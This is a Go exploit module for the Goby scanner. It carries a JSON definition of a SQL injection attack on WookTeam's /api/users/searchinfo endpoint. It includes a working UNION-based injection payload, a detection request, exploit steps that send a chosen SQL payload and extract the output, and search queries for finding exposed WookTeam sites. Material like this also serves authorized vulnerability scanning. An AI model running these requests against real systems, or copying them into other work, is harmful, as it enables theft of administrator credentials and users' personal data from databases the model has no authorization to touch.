package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WookTeam /api/users/searchinfo Interface where[username] parameter SQL Injection Vulnerability",
    "Description": "<p>WookTeam is a lightweight online team collaboration tool that provides various document tools, online mind mapping, online flowcharting, project management, task distribution, and knowledge base management tools.</p><p>The WookTeam searchinfo interface is vulnerable to SQL injection. Attackers can exploit this SQL injection vulnerability to retrieve information from the database, such as administrator backend passwords and user personal information on the site.</p>",
    "Product": "wookteam",
    "Homepage": "https://www.wookteam.com/",
    "DisclosureDate": "2024-03-18",
    "PostTime": "2024-03-19",
    "Author": "2783712916@qq.com",
    "FofaQuery": "title=\"Wookteam\" && body=\"<div>PAGE LOADING</div>\"",
    "GobyQuery": "title=\"Wookteam\" && body=\"<div>PAGE LOADING</div>\"",
    "Level": "2",
    "Impact": "<p>WookTeam /api/users/searchinfo interface is vulnerable to SQL injection. Attackers can exploit this SQL injection vulnerability to retrieve information from the database, such as administrator backend passwords and user personal information on the site.</p>",
    "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqlPayload",
            "type": "input",
            "value": "ad') UNION ALL SELECT user(),NULL,NULL,NULL,NULL-- -",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/users/searchinfo?where[username]=ad%27)%20UNION%20ALL%20SELECT%20md5('a1b2'),NULL,NULL,NULL,NULL--%20-&where[identity]&where[noidentity]&where[nousername]=admin&where[projectid]=2&take=30&__Access-Control-Allow-Origin=true&_nocache=1678774831192",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "f2e49af795161e14acf9d9245473a368",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/api/users/searchinfo?where[username]=ad%27)%20UNION%20ALL%20SELECT%20md5('a1b2'),NULL,NULL,NULL,NULL--%20-&where[identity]&where[noidentity]&where[nousername]=admin&where[projectid]=2&take=30&__Access-Control-Allow-Origin=true&_nocache=1678774831192"
            ]
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "999",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "encodeSqlPayload|define|url_encode|{{{sqlPayload}}}"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/api/users/searchinfo?where[username]={{{encodeSqlPayload}}}&where[identity]&where[noidentity]&where[nousername]=admin&where[projectid]=2&take=30&__Access-Control-Allow-Origin=true&_nocache=1678774831192",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"msg\":\"success\",\"data\":[{\"id\":",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|{\"id\":\"(.*?)\","
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2023"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "WookTeam /api/users/searchinfo接口 where[username]参数 SQL注入漏洞",
            "Product": "wookteam",
            "Description": "<p>wookteam 是一款轻量级的在线团队协作工具，提供各类文档工具、在线思维导图、在线流程图、项目管理、任务分发，知识库管理等工具。</p><p>wookteam&nbsp; /api/users/searchinfo接口存在SQL注入漏洞，攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）</p>",
            "Recommendation": "<p>1.联系相关厂商，获取安全补丁，及时进行漏洞修复</p><p>2.联系相关安全厂商，及时更新安全阻断策略</p>",
            "Impact": "<p>wookteam&nbsp; /api/users/searchinfo接口存在SQL注入漏洞，攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）<br><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "WookTeam /api/users/searchinfo Interface where[username] parameter SQL Injection Vulnerability",
            "Product": "wookteam",
            "Description": "<p>WookTeam is a lightweight online team collaboration tool that provides various document tools, online mind mapping, online flowcharting, project management, task distribution, and knowledge base management tools.<br></p><p>The WookTeam&nbsp;searchinfo interface is vulnerable to SQL injection. Attackers can exploit this SQL injection vulnerability to retrieve information from the database, such as administrator backend passwords and user personal information on the site.<br></p>",
            "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
            "Impact": "<p>WookTeam /api/users/searchinfo interface is vulnerable to SQL injection. Attackers can exploit this SQL injection vulnerability to retrieve information from the database, such as administrator backend passwords and user personal information on the site.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
